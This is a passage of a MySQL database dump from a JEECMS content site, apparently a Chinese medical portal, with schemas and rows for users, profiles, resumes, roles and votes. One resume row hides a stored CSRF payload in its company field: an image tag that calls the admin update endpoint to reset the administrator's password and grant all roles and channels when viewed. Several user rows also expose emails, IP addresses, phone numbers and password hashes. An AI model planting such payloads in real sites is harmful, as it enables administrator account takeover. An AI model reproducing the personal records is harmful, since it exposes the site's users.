INSERT INTO `jc_user` VALUES ('12', '2', '3', '彩虹妹妹', null, 'caihongyixue@163.com', '2017-01-24 12:56:23', '110.22.22.220', '2017-01-24 12:59:21', '110.22.22.220', '3', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', '55686FDB5539095B8A4EC2142C740A88', '0', '0', '4', '1', '8', '35', '1', null);
INSERT INTO `jc_user` VALUES ('13', '1', null, 'Butter', null, 'dlxiyoulinux@gmail.com', '2017-01-24 17:06:34', '60.22.103.9', '2017-01-24 17:06:44', '60.22.103.9', '1', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', '805F7D16485CF7F4A92982B9FF4168B2', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('14', '2', '5', '彩虹', null, 'caihongyixue@163.com', '2017-01-24 17:08:56', '110.22.22.220', '2017-01-28 09:28:28', '110.22.22.220', '4', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', '4C311F8E4B70B8251FB4FB68A7E2E5A3', '0', '0', '4', '3', '8', '35', '1', null);
INSERT INTO `jc_user` VALUES ('15', '1', null, 'Daisy', null, '1213388927@qq.com', '2017-01-24 17:09:33', '211.101.240.18', '2017-01-24 17:18:45', '211.101.240.18', '1', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', '3C9E189D885121451CB5B88867C3E71C', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('16', '1', null, 'shbqsl-790818', null, '125257175@qq.com.cn', '2017-01-24 17:11:11', '180.212.194.81', '2017-01-24 17:52:00', '180.212.194.81', '2', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', '67A7C25B0B9A29D489227409BC15EB4E', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('17', '1', null, '李炳辰', null, 'yyy9990@vip.163.com', '2017-01-24 17:19:59', '171.214.210.223', '2017-01-24 17:20:12', '171.214.210.223', '1', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', 'B91A4FB5599CBA0BCCCDF0A45E071C18', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('18', '1', null, 'shbqsl-790818sss', null, '125257175@qq.com', '2017-01-24 18:40:54', '180.212.194.81', '2017-01-24 18:42:21', '180.212.194.81', '2', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', '4CFB3B5B98AA41E391A5D8B5621FE33F', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('19', '1', null, 'shbqsl-790818a', null, '125257175@qq.com', '2017-01-24 18:51:23', '180.212.194.81', '2017-01-24 18:52:08', '180.212.194.81', '1', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', '8358F444C334A354C8B4D6989C451AAD', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('20', '1', null, 'shbqsl-790818aa', null, '125257175@qq.com', '2017-01-24 19:08:21', '180.212.194.81', '2017-01-24 19:08:29', '180.212.194.81', '2', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', '229D8A51706FD481C890A13792864C79', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('21', '1', null, 'ydk110', null, '564464797@qq.com', '2017-01-24 23:35:03', '221.203.80.59', '2017-01-25 01:13:23', '42.87.163.187', '4', '0', '0', '0', '2017-01-24', '0', '0', '0', '0', '0', '0', 'B6D8F492C8055F703D0A7B80FADBDAAD', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('22', '1', null, '北极光', null, '133620311@qq.com', '2017-01-25 10:12:36', '124.202.226.50', '2017-01-25 10:13:06', '124.202.226.50', '1', '0', '0', '0', '2017-01-25', '0', '0', '0', '0', '0', '0', '226B67FA39A6D368AE96D7810D8E03A3', '0', '0', null, null, null, '1', '0', null);
INSERT INTO `jc_user` VALUES ('23', '2', null, 'caihong5', '15882454451', 'qianfo@713.com', '2017-02-01 00:38:06', '101.207.227.70', '2017-02-01 11:50:01', '127.0.0.1', '1', '0', '0', '0', '2017-02-01', '0', '0', '0', '0', '0', '0', 'EA13B098142600FB03BBCA0680A9E318', '0', '0', '4', '1', '8', '35', '0', null);
INSERT INTO `jc_user` VALUES ('27', '2', '3', 'caihong4', '15588882222', '123@163.com', '2017-02-01 17:21:42', '127.0.0.1', '2017-02-01 17:21:42', '127.0.0.1', '0', '0', '0', '0', '2017-02-01', '0', '0', '0', '0', '0', '0', null, '0', '0', '4', '1', '8', '35', '0', null);
INSERT INTO `jc_user` VALUES ('28', '2', null, 'caihong6', '15588882223', 'caihongyixue@qq.com', '2017-02-01 17:42:22', '127.0.0.1', '2017-02-01 17:42:22', '127.0.0.1', '0', '0', '0', '0', '2017-02-01', '0', '0', '0', '0', '0', '0', null, '0', '0', '4', '1', '8', '35', '1', null);
INSERT INTO `jc_user` VALUES ('29', '2', '3', 'test', '1', '77219569@qq.com', '2017-02-01 19:36:23', '127.0.0.1', '2017-02-01 19:36:23', '127.0.0.1', '0', '0', '0', '0', '2017-02-01', '0', '0', '0', '0', '0', '0', null, '0', '0', '4', '1', '8', '35', '0', null);
INSERT INTO `jc_user` VALUES ('30', '2', '3', 'test1', '15588882222', '77219569@qq.com', '2017-02-02 23:42:18', '127.0.0.1', '2017-02-02 23:42:18', '127.0.0.1', '0', '0', '0', '0', '2017-02-02', '0', '0', '0', '0', '0', '0', null, '0', '0', '5', '2', '9', '36', '0', null);

-- ----------------------------
-- Table structure for jc_user_account
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_account`;
CREATE TABLE `jc_user_account` (
  `user_id` int(11) NOT NULL,
  `account_weixin` varchar(255) DEFAULT NULL COMMENT '微信账号名',
  `account_weixin_openId` varchar(255) DEFAULT NULL COMMENT '微信账号openid',
  `account_alipy` varchar(255) DEFAULT NULL COMMENT '支付宝账号',
  `draw_account` tinyint(1) NOT NULL DEFAULT '0' COMMENT '提现账户(0微信 1支付宝)',
  `content_total_amount` double(15,4) DEFAULT '0.0000' COMMENT '稿费总金额',
  `content_no_pay_amount` double(15,4) DEFAULT '0.0000' COMMENT '待提现稿费金额',
  `content_year_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费年金额',
  `content_month_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费本月金额',
  `content_day_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费本日金额',
  `content_buy_count` int(11) DEFAULT NULL COMMENT '被用户购买次数',
  `draw_count` int(11) DEFAULT '0' COMMENT '累计提现次数',
  `last_draw_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次提现时间',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '上次用户购买时间',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户稿费收费配置';

-- ----------------------------
-- Records of jc_user_account
-- ----------------------------

-- ----------------------------
-- Table structure for jc_user_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_attr`;
CREATE TABLE `jc_user_attr` (
  `user_id` int(11) NOT NULL,
  `attr_name` varchar(255) NOT NULL,
  `attr_value` varchar(255) DEFAULT NULL,
  KEY `fk_jc_attr_user` (`user_id`),
  CONSTRAINT `fk_jc_attr_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户属性表';

-- ----------------------------
-- Records of jc_user_attr
-- ----------------------------

-- ----------------------------
-- Table structure for jc_user_collection
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_collection`;
CREATE TABLE `jc_user_collection` (
  `user_id` int(11) NOT NULL DEFAULT '0' COMMENT '用户id',
  `content_id` int(11) NOT NULL DEFAULT '0' COMMENT '内容id',
  PRIMARY KEY (`user_id`,`content_id`),
  KEY `fk_jc_user_collection_con` (`content_id`),
  CONSTRAINT `fk_jc_user_collection_con` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_user_collection_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户收藏关联表';

-- ----------------------------
-- Records of jc_user_collection
-- ----------------------------

-- ----------------------------
-- Table structure for jc_user_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_ext`;
CREATE TABLE `jc_user_ext` (
  `user_id` int(11) NOT NULL,
  `realname` varchar(100) DEFAULT NULL COMMENT '真实姓名',
  `gender` tinyint(1) DEFAULT NULL COMMENT '性别',
  `birthday` datetime DEFAULT NULL COMMENT '出生日期',
  `intro` varchar(255) DEFAULT NULL COMMENT '个人介绍',
  `comefrom` varchar(150) DEFAULT NULL COMMENT '来自',
  `qq` varchar(100) DEFAULT NULL COMMENT 'QQ',
  `msn` varchar(100) DEFAULT NULL COMMENT 'MSN',
  `phone` varchar(50) DEFAULT NULL COMMENT '电话',
  `mobile` varchar(50) DEFAULT NULL COMMENT '手机',
  `user_img` varchar(255) DEFAULT NULL COMMENT '用户头像',
  `user_signature` varchar(255) DEFAULT NULL COMMENT '用户个性签名',
  PRIMARY KEY (`user_id`),
  CONSTRAINT `fk_jc_ext_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户扩展信息表';

-- ----------------------------
-- Records of jc_user_ext
-- ----------------------------
INSERT INTO `jc_user_ext` VALUES ('1', '彩虹医学网', '1', '2017-02-01 00:00:00', null, '四川', null, null, '1110999', '121212', '/user/images/201702/0513314963x4.jpg', '');
INSERT INTO `jc_user_ext` VALUES ('2', '彩虹', '1', null, '石伟，男，博士，副教授。上海市医学会器官移植委员会青年委员；中华医学会上海市分会普外科学会会员；上海市中西医结合学会会员。 从事普外科肝胆外科专业工作逾15年，对肝胆系统疾病的诊治有丰富的临床经验。尤其擅长肝胆系统肿瘤的微创手术和综合治疗，每年完成肝胆系统手术约400例。曾赴英国伯明翰短期交流访问；支边云南半年帮助指导当地医疗工作。参与完成省部级课题研究2项，局级课题1项。以第一作者在国际医学期刊发表SCI论文4篇，国内核心期刊发表论文多篇，作为主要译者参与完成译著《Sherlock肝胆病学》。', null, null, null, null, null, '/u/cms/www/201702/041828321nuz.jpg', null);
INSERT INTO `jc_user_ext` VALUES ('3', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('4', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('5', null, null, null, null, null, null, null, null, null, '/user/images/201701/17143716s6tr.jpg', null);
INSERT INTO `jc_user_ext` VALUES ('6', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('7', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('10', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('11', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('12', '彩虹妹妹', null, null, null, null, null, null, null, null, '/u/cms/www/201702/05030743gloz.jpg', null);
INSERT INTO `jc_user_ext` VALUES ('13', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('14', '彩虹1', null, null, null, null, null, null, null, null, '/u/cms/www/201702/04184434cm8g.jpg', null);
INSERT INTO `jc_user_ext` VALUES ('15', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('16', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('17', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('18', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('19', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('20', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('21', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('22', null, null, null, null, null, null, null, null, null, null, null);
INSERT INTO `jc_user_ext` VALUES ('23', '柳柳', null, null, null, null, null, null, null, null, '/u/cms/www/201702/04183107ojjm.jpg', null);
INSERT INTO `jc_user_ext` VALUES ('27', '王五', '1', null, null, null, null, null, null, null, '/u/cms/www/201702/04182757mfkn.jpg', null);
INSERT INTO `jc_user_ext` VALUES ('28', null, null, null, null, null, null, null, null, null, '/u/cms/www/201702/04182725twg7.jpg', null);
INSERT INTO `jc_user_ext` VALUES ('29', '王五', null, null, null, null, null, null, null, null, '/u/cms/www/201702/04182703yuaq.jpg', null);
INSERT INTO `jc_user_ext` VALUES ('30', '张峰', null, null, null, null, null, null, null, null, '/u/cms/www/201702/04182632usio.jpg', null);

-- ----------------------------
-- Table structure for jc_user_follow
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_follow`;
CREATE TABLE `jc_user_follow` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户id',
  `follow_user_id` int(11) NOT NULL,
  `time` datetime NOT NULL COMMENT '关注时间',
  PRIMARY KEY (`id`),
  UNIQUE KEY `fk_follow_Idx` (`user_id`,`follow_user_id`) USING BTREE,
  KEY `fk_follow_userid` (`follow_user_id`),
  CONSTRAINT `follow_userid` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `follower_userid` FOREIGN KEY (`follow_user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of jc_user_follow
-- ----------------------------

-- ----------------------------
-- Table structure for jc_user_menu
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_menu`;
CREATE TABLE `jc_user_menu` (
  `menu_id` int(11) NOT NULL AUTO_INCREMENT,
  `menu_name` varchar(255) NOT NULL COMMENT '菜单名称',
  `menu_url` varchar(255) NOT NULL COMMENT '菜单地址',
  `priority` int(11) NOT NULL DEFAULT '10',
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`menu_id`),
  KEY `fk_jc_menu_user` (`user_id`),
  CONSTRAINT `fk_jc_menu_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户常用菜单';

-- ----------------------------
-- Records of jc_user_menu
-- ----------------------------

-- ----------------------------
-- Table structure for jc_user_resume
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_resume`;
CREATE TABLE `jc_user_resume` (
  `user_id` int(11) NOT NULL,
  `resume_name` varchar(255) NOT NULL COMMENT '简历名称',
  `target_worknature` varchar(255) DEFAULT NULL COMMENT '期望工作性质',
  `target_workplace` varchar(255) DEFAULT NULL COMMENT '期望工作地点',
  `target_category` varchar(255) DEFAULT NULL COMMENT '期望职位类别',
  `target_salary` varchar(255) DEFAULT NULL COMMENT '期望月薪',
  `edu_school` varchar(255) DEFAULT NULL COMMENT '毕业学校',
  `edu_graduation` datetime DEFAULT NULL COMMENT '毕业时间',
  `edu_back` varchar(255) DEFAULT NULL COMMENT '学历',
  `edu_discipline` varchar(255) DEFAULT NULL COMMENT '专业',
  `recent_company` varchar(500) DEFAULT NULL COMMENT '最近工作公司名称',
  `company_industry` varchar(255) DEFAULT NULL COMMENT '最近公司所属行业',
  `company_scale` varchar(255) DEFAULT NULL COMMENT '公司规模',
  `job_name` varchar(255) DEFAULT NULL COMMENT '职位名称',
  `job_category` varchar(255) DEFAULT NULL COMMENT '职位类别',
  `job_start` datetime DEFAULT NULL COMMENT '工作起始时间',
  `subordinates` varchar(255) DEFAULT NULL COMMENT '下属人数',
  `job_description` text COMMENT '工作描述',
  `self_evaluation` varchar(2000) DEFAULT NULL COMMENT '自我评价',
  PRIMARY KEY (`user_id`),
  CONSTRAINT `fk_jc_resume_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户简历';

-- ----------------------------
-- Records of jc_user_resume
-- ----------------------------
INSERT INTO `jc_user_resume` VALUES ('1', '程序员', '', '', '', '', '家里蹲大学', null, '', '吃饭', '<img src=/jeeadmin/jeecms/admin_global/o_update.do?password=111&groupId=1&rank=9&roleIds=1&siteIds=1&steps=2&allChannels=true&id=1＞', null, null, '11', null, null, null, '111\r\n222222222222222222222222222\r\n3333333333333333333333333333333333\r\n44444444444444444444444444444444444444444\r\n55555555555555555555555555555555555', '我很强大的哦');

-- ----------------------------
-- Table structure for jc_user_role
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_role`;
CREATE TABLE `jc_user_role` (
  `role_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`role_id`,`user_id`),
  KEY `fk_jc_role_user` (`user_id`),
  CONSTRAINT `fk_jc_role_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户角色关联表';

-- ----------------------------
-- Records of jc_user_role
-- ----------------------------
INSERT INTO `jc_user_role` VALUES ('1', '1');

-- ----------------------------
-- Table structure for jc_user_site
-- ----------------------------
DROP TABLE IF EXISTS `jc_user_site`;
CREATE TABLE `jc_user_site` (
  `usersite_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT '1' COMMENT '审核级别',
  `is_all_channel` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否拥有所有栏目的权限',
  `is_all_channel_control` tinyint(1) NOT NULL DEFAULT '1' COMMENT '所有栏目控制权限',
  PRIMARY KEY (`usersite_id`),
  KEY `fk_jc_site_user` (`user_id`),
  KEY `fk_jc_user_site` (`site_id`),
  CONSTRAINT `fk_jc_site_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS管理员站点表';

-- ----------------------------
-- Records of jc_user_site
-- ----------------------------
INSERT INTO `jc_user_site` VALUES ('2', '1', '1', '3', '1', '1');

-- ----------------------------
-- Table structure for jc_vote_item
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_item`;
CREATE TABLE `jc_vote_item` (
  `voteitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `votetopic_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `vote_count` int(11) NOT NULL DEFAULT '0' COMMENT '投票数量',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `subtopic_id` int(11) DEFAULT NULL,
  `picture` varchar(255) DEFAULT NULL COMMENT '图片',
  PRIMARY KEY (`voteitem_id`),
  KEY `fk_jc_vote_item_topic` (`votetopic_id`),
  KEY `FK_jc_vote_item_subtopic` (`subtopic_id`),
  CONSTRAINT `FK_jc_vote_item_subtopic` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`),
  CONSTRAINT `fk_jc_vote_item_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=utf8 COMMENT='CMS投票项';

-- ----------------------------
-- Records of jc_vote_item
-- ----------------------------
INSERT INTO `jc_vote_item` VALUES ('12', '2', '很喜欢', '74', '1', '13', '');
INSERT INTO `jc_vote_item` VALUES ('13', '2', '不喜欢', '0', '3', '13', '');
INSERT INTO `jc_vote_item` VALUES ('14', '2', '喜欢', '3', '2', '13', '');
INSERT INTO `jc_vote_item` VALUES ('15', '2', '差不多', '0', '6', '15', '');
INSERT INTO `jc_vote_item` VALUES ('16', '2', '没有改进', '0', '7', '15', '');
INSERT INTO `jc_vote_item` VALUES ('17', '2', '改进很大', '81', '4', '15', '');
INSERT INTO `jc_vote_item` VALUES ('18', '2', '有改进', '3', '5', '15', '');
INSERT INTO `jc_vote_item` VALUES ('19', '2', '图库', '76', '9', '16', '');
INSERT INTO `jc_vote_item` VALUES ('20', '2', '新闻', '80', '8', '16', '');
INSERT INTO `jc_vote_item` VALUES ('21', '2', '下载', '72', '11', '16', '');
INSERT INTO `jc_vote_item` VALUES ('22', '2', '视频', '72', '10', '16', '');
INSERT INTO `jc_vote_item` VALUES ('26', '3', '5000', '0', '2', '18', '');
INSERT INTO `jc_vote_item` VALUES ('27', '3', '10000', '1', '3', '18', '');
INSERT INTO `jc_vote_item` VALUES ('28', '3', '3000', '0', '1', '18', '');
INSERT INTO `jc_vote_item` VALUES ('33', '4', '4号', '0', '4', '20', '');
INSERT INTO `jc_vote_item` VALUES ('34', '4', '2号', '0', '2', '20', '');
INSERT INTO `jc_vote_item` VALUES ('35', '4', '1号', '0', '1', '20', '');
INSERT INTO `jc_vote_item` VALUES ('36', '4', '3号', '0', '3', '20', '');
INSERT INTO `jc_vote_item` VALUES ('37', '5', '1号', '0', '1', '21', '');
INSERT INTO `jc_vote_item` VALUES ('38', '5', '2号', '0', '2', '21', '');
INSERT INTO `jc_vote_item` VALUES ('39', '5', '3号', '0', '3', '21', '');
INSERT INTO `jc_vote_item` VALUES ('40', '5', '4号', '0', '4', '21', '');
INSERT INTO `jc_vote_item` VALUES ('41', '6', '张', '0', '1', '22', '');
INSERT INTO `jc_vote_item` VALUES ('42', '6', '李', '0', '2', '22', '');
INSERT INTO `jc_vote_item` VALUES ('43', '6', '陈', '0', '3', '22', '');
INSERT INTO `jc_vote_item` VALUES ('44', '6', '王', '0', '4', '22', '');
INSERT INTO `jc_vote_item` VALUES ('45', '7', '赵', '0', '1', '23', '');
INSERT INTO `jc_vote_item` VALUES ('46', '7', '孙', '0', '2', '23', '');
INSERT INTO `jc_vote_item` VALUES ('47', '7', '姚', '0', '3', '23', '');
INSERT INTO `jc_vote_item` VALUES ('48', '7', '黄', '0', '4', '23', '');
INSERT INTO `jc_vote_item` VALUES ('49', '8', '钱', '0', '1', '24', '');
INSERT INTO `jc_vote_item` VALUES ('50', '8', '周', '0', '2', '24', '');
INSERT INTO `jc_vote_item` VALUES ('51', '8', '郑', '0', '3', '24', '');
INSERT INTO `jc_vote_item` VALUES ('52', '8', '胡', '0', '4', '24', '');
INSERT INTO `jc_vote_item` VALUES ('53', '9', '南大', '0', '1', '25', '');
INSERT INTO `jc_vote_item` VALUES ('54', '9', '财大', '0', '2', '25', '');
INSERT INTO `jc_vote_item` VALUES ('55', '9', '师大', '0', '3', '25', '');
INSERT INTO `jc_vote_item` VALUES ('56', '9', '农大', '0', '4', '25', '');
INSERT INTO `jc_vote_item` VALUES ('57', '10', '很尽兴', '37', '1', '26', '');
INSERT INTO `jc_vote_item` VALUES ('58', '10', '还行', '0', '2', '26', '');
INSERT INTO `jc_vote_item` VALUES ('59', '10', '没玩够', '0', '3', '26', '');
INSERT INTO `jc_vote_item` VALUES ('60', '10', '家里蹲', '0', '4', '26', '');
INSERT INTO `jc_vote_item` VALUES ('61', '11', '赞成', '16', '1', '27', '');
INSERT INTO `jc_vote_item` VALUES ('62', '11', '反对', '0', '2', '27', '');
INSERT INTO `jc_vote_item` VALUES ('63', '11', '对我不影响', '0', '3', '27', '');

-- ----------------------------
-- Table structure for jc_vote_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_record`;
CREATE TABLE `jc_vote_record` (
  `voterecored_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `votetopic_id` int(11) NOT NULL,
  `vote_time` datetime NOT NULL COMMENT '投票时间',
  `vote_ip` varchar(50) NOT NULL COMMENT '投票IP',
  `vote_cookie` varchar(32) NOT NULL COMMENT '投票COOKIE',
  `wx_open_id` varchar(50) DEFAULT NULL COMMENT '微信投票者openId',
  PRIMARY KEY (`voterecored_id`),
  KEY `fk_jc_vote_record_topic` (`votetopic_id`),
  KEY `fk_jc_voterecord_user` (`user_id`),
  CONSTRAINT `fk_jc_vote_record_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`),
  CONSTRAINT `fk_jc_voterecord_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=81 DEFAULT CHARSET=utf8 COMMENT='CMS投票记录';

-- ----------------------------
-- Records of jc_vote_record
-- ----------------------------
INSERT INTO `jc_vote_record` VALUES ('1', null, '3', '2016-09-30 14:57:46', '117.40.115.55', '85c62d7bc19b436dbb8dd21edc2ebfd5', null);
INSERT INTO `jc_vote_record` VALUES ('2', null, '11', '2016-10-09 11:38:05', '117.41.153.171', 'd2c045570d544b99885cb8f3fef658d2', null);
INSERT INTO `jc_vote_record` VALUES ('3', null, '10', '2016-10-10 14:30:05', '117.41.152.66', '837d951f500c4671bd353d0d3ebadbfa', null);
INSERT INTO `jc_vote_record` VALUES ('4', null, '11', '2016-10-10 14:30:05', '117.41.152.66', 'fc848a92556a4c559f79f02ca04a9ffa', null);
INSERT INTO `jc_vote_record` VALUES ('5', null, '11', '2016-10-10 16:00:55', '117.41.152.66', '0bf2c8f72d94473db38bd95ebaefcdfd', null);
INSERT INTO `jc_vote_record` VALUES ('8', null, '11', '2016-10-10 16:00:56', '117.41.152.66', 'b22d8d1d813f4bc2b4e4c665c4e615fa', null);
INSERT INTO `jc_vote_record` VALUES ('9', null, '11', '2016-10-10 16:00:56', '117.41.152.66', '88db248d9fe147f6897671de3fb568f9', null);
INSERT INTO `jc_vote_record` VALUES ('12', null, '11', '2016-10-10 16:00:56', '117.41.152.66', '465da02a13fc4f7fa2b72781d7bbf8e1', null);
INSERT INTO `jc_vote_record` VALUES ('14', null, '11', '2016-10-10 16:00:56', '117.41.152.66', 'c15529ef4ce245f781b64f7f2cb953bf', null);
INSERT INTO `jc_vote_record` VALUES ('17', null, '10', '2016-10-10 16:00:56', '117.41.152.66', '1ea33a4323994d89b4bcc873116e93be', null);
INSERT INTO `jc_vote_record` VALUES ('19', null, '11', '2016-10-10 16:00:57', '117.41.152.66', '4ad719ade7594ceaa1015e9bfc1b3f47', null);
INSERT INTO `jc_vote_record` VALUES ('20', null, '11', '2016-10-10 16:00:57', '117.41.152.66', 'ff7f622c3a1c4529894de76c523b553c', null);
INSERT INTO `jc_vote_record` VALUES ('21', null, '11', '2016-10-10 16:00:57', '117.41.152.66', '36b4f3912f264a83b135486b34827d65', null);
INSERT INTO `jc_vote_record` VALUES ('22', null, '10', '2016-10-10 16:00:57', '117.41.152.66', '901cb03ec75145eeaf60702c1e3064d5', null);
INSERT INTO `jc_vote_record` VALUES ('23', null, '11', '2016-10-10 16:00:57', '117.41.152.66', '49b4dd1536e2467aad34d80bc1016efc', null);
INSERT INTO `jc_vote_record` VALUES ('24', null, '10', '2016-10-10 16:00:57', '117.41.152.66', '3759152aa2fc4036b46eaf58c70ac6b5', null);
INSERT INTO `jc_vote_record` VALUES ('25', null, '11', '2016-10-10 16:00:58', '117.41.152.66', 'd8ae1822d8ad4203a88008815f15aa9b', null);
INSERT INTO `jc_vote_record` VALUES ('26', null, '10', '2016-10-10 16:00:58', '117.41.152.66', 'e60dbfc647f54d2b86dd36ee4b541fc6', null);
INSERT INTO `jc_vote_record` VALUES ('30', null, '10', '2016-10-10 16:00:58', '117.41.152.66', 'd78a0d8166be459b93a29b7d8c342371', null);
INSERT INTO `jc_vote_record` VALUES ('31', null, '11', '2016-10-10 16:00:58', '117.41.152.66', '207ccc615b7a410e87bb51c39adcbe60', null);
INSERT INTO `jc_vote_record` VALUES ('32', null, '10', '2016-10-10 16:00:58', '117.41.152.66', 'bfc4dd4213424263a2790715649fecc9', null);
INSERT INTO `jc_vote_record` VALUES ('34', null, '10', '2016-10-10 16:00:58', '117.41.152.66', 'df5764ee8165497b82c550f66ff9d8a5', null);
INSERT INTO `jc_vote_record` VALUES ('35', null, '11', '2016-10-10 16:00:59', '117.41.152.66', '962c03f30edb4cc4ba01e7397361bdc7', null);
INSERT INTO `jc_vote_record` VALUES ('36', null, '10', '2016-10-10 16:00:59', '117.41.152.66', '101593c1b84d48638958b7503d2f3659', null);
INSERT INTO `jc_vote_record` VALUES ('38', null, '10', '2016-10-10 16:00:59', '117.41.152.66', '8e3ea7a9bf4c442495f5a0ea05e31fd3', null);
INSERT INTO `jc_vote_record` VALUES ('40', null, '10', '2016-10-10 16:00:59', '117.41.152.66', 'd55e04b63a85415f82b9e101e65593e0', null);
INSERT INTO `jc_vote_record` VALUES ('41', null, '10', '2016-10-10 16:00:59', '117.41.152.66', 'a0fa6f6f3a8a49fab812cd7dc5e1a0f2', null);
INSERT INTO `jc_vote_record` VALUES ('43', null, '10', '2016-10-10 16:01:00', '117.41.152.66', '5b4e56ce66ea43e38640f1c3434d683e', null);
INSERT INTO `jc_vote_record` VALUES ('44', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'f1502ea8feed44c9981428fba35e9aff', null);
INSERT INTO `jc_vote_record` VALUES ('45', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'fb3dfceba790475fb563904b553fec91', null);
INSERT INTO `jc_vote_record` VALUES ('46', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'eef4c07438f94622a2922ec015971c42', null);
